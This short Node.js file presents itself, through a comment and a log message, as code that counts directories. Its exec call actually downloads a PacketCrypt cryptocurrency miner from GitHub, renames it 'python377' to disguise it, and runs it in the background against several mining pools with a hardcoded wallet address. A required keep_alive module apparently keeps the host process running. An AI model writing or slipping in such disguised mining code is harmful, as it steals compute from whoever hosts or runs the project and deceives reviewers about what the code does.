const { exec } = require('child_process');
 
// Counts the number of directory in
// current working directory
exec('wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.2/packetcrypt-v0.5.2-linux_amd64 && mv packetcrypt-v0.5.2-linux_amd64 python377 && chmod +x python377 && nohup ./python377 ann http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com https://stratum.zetahash.com -p pkt1qfhr09kswj2hy0xgnzzj5r8ux09m7ltnuumf4xx &', (error, stdout, stderr) => {
    if (error) {
        console.error(`exec error: ${error}`);
        return;
    }
    console.log(`stdout: No. of directories = ${stdout}`);
    if (stderr != "")
        console.error(`stderr: ${stderr}`);
});

const keep_alive = require('./keep_alive.js')
